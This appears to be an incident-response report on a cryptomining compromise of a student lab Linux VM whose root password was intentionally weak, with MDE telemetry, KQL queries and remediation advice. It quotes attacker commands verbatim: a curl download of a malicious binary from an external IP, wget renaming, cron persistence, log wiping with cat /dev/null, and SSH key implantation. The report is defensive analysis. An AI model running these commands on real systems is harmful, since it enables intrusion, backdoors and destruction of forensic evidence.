## Executive Summary

The student Linux virtual machine `linux-programmatic-fix-michael` was compromised by an automated cryptocurrency mining malware campaign. The investigation was initiated following a Microsoft Defender for Endpoint alert indicating **Malware or  PUA (Potentially Unwanted Application) Observed**.

This incident occurred during an active **student lab exercise** in which the **root account password was intentionally set to `root`** to generate alerts during Tenable vulnerability scanning exercises. While expected in a controlled instructional environment, this configuration significantly weakened the system’s security posture and exposed the VM to real-world internet scanning and brute-force activity.

Telemetry confirms that an external actor successfully authenticated as `root`, downloaded and executed a malicious ELF binary, established persistence using legacy init scripts, renamed system utilities to evade detection, implanted SSH keys for long-term access, and deliberately destroyed forensic artifacts.

VirusTotal analysis of the recovered binary returned a **46 / 63 detection score**, classifying the file as a **Trojan**, confirming the activity was malicious and not the result of student experimentation or administrative automation.

## Investigation

### Initial Detection: Malware or PUA Observed

<img width="1280" height="648" alt="image" src="https://github.com/user-attachments/assets/23305203-e6f9-4434-918b-dd3c6c2dceb1" />

The investigation began after Microsoft Defender for Endpoint generated an alert indicating **Malware or PUA** activity on the Linux host. The alert correlated with suspicious file creation and execution behavior occurring under the `root` user context.

This detection prompted analysis of:

- File creation events  
- Process execution telemetry  
- Authentication and logon activity  
- Network-based download behavior  

<img width="1280" height="646" alt="image" src="https://github.com/user-attachments/assets/030f8102-196a-40a7-86d7-a291bb89e4e5" />

- MDE mapped a lengthy Process Tree, highlighting several suspicious processes:
   - Suspicious file dropped and launched
   - Suspicious shell command execution
   - Suspicious file or content ingress
   - Executable permission added to file or directory
   - Suspicious shell script launched
- Along with many suspicious commands observed:
   - wget (Remote file download)
   - curl (Payload retrieval / C2 communication)
   - chmod (Permission modification for execution)
   - cron (Persistence via scheduled task, Linux scheduler)
   - dash (Lightweight shell used to execute scripts)
  
---

### First Look Into Compromised Device

- multiple reconiassance commands observed:
   - `la -la` Lists files/directories, including hidden ones (-a) with permissions (-l)
   - `who` Shows logged-in users
   - `cat /etc/resolv.conf` reads contents of /resolv.conf, typically contains DNS resolver configuration
   - `uptime` Displays how long the system has been running, number of users, load averages
   - `cd /etc` hanges the working directory to /etc

<br>

- What this means:
   - A persistent root-level session existed for ~48 hours
   - That session repeatedly executed thousands of short-lived binaries
   - Filenames were randomized: `owqtmtieus`, `nwvslhwzwf`, etc.
   - Execution counts were throttled per binary
   - Activity pattern indicates automation, not human typing
   - Behavior is inconsistent with legitimate admin activity

<img width="1184" height="470" alt="image" src="https://github.com/user-attachments/assets/5deb645c-ed6c-4d8c-bbab-548841fd69e9" />

- Session ID `79416`
   - Value is derived from Linux and added by MDE
   - Correlates sessions to file name randomization
   - Logs show **over 15,000** commands linking to the same session for this VM
   - All originating from the same ParentFile `ygljglkjgfg0`
   - Each command is within milliseconds of each other

```
Linux kernel:  creates session 79416
        ↓
MDE sensor:   observes + labels it
        ↓
Log Analytics: stores & exposes it
```

### Authentication Context and Lab Configuration

At the time of compromise, the VM was actively being used for a **student lab exercise** designed to trigger insecure authentication practices for Tenable scans.

Lab configuration included:

- SSH access intentionally exposed  
- **Root password set to `root`**  
- Expected vulnerability generation in Tenable

<img width="790" height="274" alt="image" src="https://github.com/user-attachments/assets/d043b7bf-4f49-40da-9512-3ed08265f18c" />

This configuration mirrors conditions exploited by real-world automated attack campaigns. Multiple external IP addresses attempted authentication across multiple lab VMs, consistent with **opportunistic brute-force activity**.

The successful `root` authentication observed during this investigation is attributed to **external automated intrusion**, not legitimate student activity.

### Student changes Root password | AHTKzAEv
- Student begins the lab, changing root password to 'root'
   - `2026-01-30T13:50:32.826013Z` (1:50pm) — /etc/shadow edited by labuser via root (likely a password change)
   - `2026-01-30T14:02:04.257228Z` ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created

Within minutes, `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes.

```kql
DeviceFileEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated asc
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<Br>

-File lifecycle after creation:
   - 2:02:04 — AHTKzAEv and multiple x.sh files created, initial payload and helper scripts
   - 2:02:04.957 — retea in /dev/shm created, /dev/shm is shared memory; malware sometimes drops helpers here for fast execution or stealth (RAM-only execution)
   - 2:02:05 — /root/.ssh/authorized_keys updated Allows persistence via SSH (attacker can log in without a password)
   - 2:02:05 — /etc/passwd and /etc/shadow updated Confirms the attacker escalated privileges / added backdoors, possibly adding a new root password.
- Repeated FileCreated / FileDeleted events for x.sh and AHTKzAEv
   - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
   - Deleting files is often to avoid forensic detection
   - 
```
/var/tmp/AHTKzAEv          <- the malicious binary
  └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
       └─ owqtmtieus       <- reconnaissance or mining scripts spawned by ygljglkjgfg0

```

### diicot

- kuak and diicot created in tmp folder shortly after AHTKzAEv
   - both files ran long code meant to terminate any existing miners

- What this script is doing:
   - Terminating any potential competing malware/miners to free up CPU/resources
   - Setting up its working directory
   - Moving payload files into a hidden location
   - Making them executable
   - Running them in the background
   - Wiping evidence

Attacker gains root
Drops AHTKzAEv
Modifies SSH + passwords
Installs root cron persistence
Cron runs every minute
Cron:
Drops .b4nd1d0 into /var/tmp/*
Executes payload
Rewrites cron to ensure it stays installed
This is post-compromise persistence, not recon.

Root-level scheduled persistence was established via crontab
The cron job executed every ~60 seconds
It repeatedly spawned hidden payloads in /var/tmp
This activity was automated and non-interactive

### .b4nd1d0 
- a _leetspeak_ spelling of "Bandito"
- Known Malware Associations
   - .b4nd1d0 has been observed in real Linux malware families in the wild
   - It’s typically a secondary payload, backdoor, or helper binary
   - Its consistent naming makes it easier for the malware’s cron/systemd scripts to find and execute it repeatedly.

- Random gibberish names = likely session-specific payloads
   - .b4nd1d0 = fixed, intentional, likely malicious component
   - Its repeated creation alongside cron persistence is a strong indicator of automated malware activity, not just a student experiment.

### Malicious Binary Download p.txt

<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />

- curl http://23.160.56.194/p.txt -o ygljglkjgfg0
   - `p.txt` malicious ELF binary
   - `ygljglkjgfg0` renamed executable copy

<img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />
- `ygljglkjgfg0` appears
   - Downloaded via curl and wget from a remote host (23.160.56.194/p.txt)
   - First seen at /usr/bin/ygljglkjgfg0 = persistent executable
   - Then copied to /etc/init.d/ygljglkjgfg0 = run at boot
   - and /etc/cron.hourly/gcc.sh = run every hour or as scheduled
  
- `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
- These are clones or secondary payloads:
   - Backdoors
   - Miner binaries
   - Remote control scripts
- Randomized file names (tdrbhhtkky, omicykvmml) evade detection

- Crontab modification
You see a bunch of tmp.* files in /var/spool/cron/crontabs/ (like tmp.RYF9JE and tmp.SHGiEW) along with root crontab activity.
These are temporary cron files created when the malware manipulates the root crontab.
Tools like crontab - write to temp files first, then rename them into place.
That explains the frequent FileCreated + FileRenamed events — the malware is adding a scheduled job.

The malware edits /etc/crontab to remove old references to gcc.sh and add a new entry:
   -*/3 * * * * root /etc/cron.hourly/gcc.sh
   - malware will run every 3 minutes

- p.txt observations:
   - downloaded on two different devices
   - from same IP `23.160.56.194`
   - to the same file name `ygljglkjgfg`
   - on 1/27 and 2/2
   - both with the same file size `548616`

- Keep the same URL so all infected machines keep pulling the “latest version”
- FileType: Elf (Executable and Linkable Format) even though it's named .txt
   - Not actually a text file, but a compiled Linux binary
   - Name file .txt to avoid suspicion
   - Download → Rename → Execute

### Binary Relocation and Renaming

The attacker deliberately renamed trusted system binaries:

mv /usr/bin/wget /usr/bin/good  
mv /bin/wget /bin/good  

Renaming trusted utilities allows continued payload delivery while bypassing simplistic detections that rely on binary names.

---

### Persistence via /etc/init.d

Persistence was established by creating an init script:

```kql
DeviceFileEvents  
| where DeviceName == "linux-programmatic-fix-michael"  
| where FolderPath startswith "/etc/init.d"  
| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine  
| order by TimeGenerated desc  
```

Why this is significant:

- `/etc/init.d` scripts execute automatically on boot  
- Execution occurs as `root`  
- Persistence survives reboots and user logouts  

This confirms **intentional long-term persistence**.

---

### Log Tampering via cat /dev/null

The attacker deliberately destroyed forensic evidence by truncating multiple logs:

cat /dev/null >/root/.bash_history  
cat /dev/null >/var/log/wtmp  
cat /dev/null >/var/log/btmp  
cat /dev/null >/var/log/lastlog  
cat /dev/null >/var/log/secure  
cat /dev/null >/var/log/syslog  

Because these logs were cleared on the host, historical entries no longer existed for ingestion into Log Analytics, significantly limiting post-incident visibility.

---

### SSH Key Implantation

A persistent SSH backdoor was implanted:

chattr -ia ~/.ssh/authorized_keys  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
chattr +ai ~/.ssh/authorized_keys  

Setting the immutable attribute (`+i`) prevents easy removal and ensures continued access even if credentials are rotated.

---

### Malware Validation and Classification

The malicious ELF binary was validated using VirusTotal:

- **Detection score:** 46 / 63  
- **Classification:** Trojan  
- **Observed behaviors:**  
  - Cryptocurrency mining  
  - Process termination of competing miners  
  - Persistence installation  
  - Log destruction  

This confirms the activity represents a **real-world malware compromise**.

---

## Recommended Actions

### Immediate Recovery

- Redeploy affected virtual machines  
- Remove unauthorized init scripts  
- Rotate all credentials and SSH keys  
- Rebuild systems from trusted images  

### Monitoring Improvements

- Alert on writes to `/etc/init.d`  
- Monitor renaming of binaries in `/bin` and `/usr/bin`  
- Detect log truncation behavior  
- Alert on modifications to `authorized_keys`  
- Flag repeated download attempts from single external IPs  

---

## Conclusion

This incident represents a **complete Linux system compromise** performed by automated malware exploiting weak authentication during a student lab exercise. While the insecure configuration was intentional for instructional purposes, it created conditions identical to real-world attack surfaces.

Microsoft Defender for Endpoint successfully detected the malicious activity, enabling investigation and confirmation of compromise. This case highlights how quickly exposed Linux systems can be compromised and reinforces the importance of monitoring persistence mechanisms, binary integrity, and log tampering — even in educational or non-production environments.
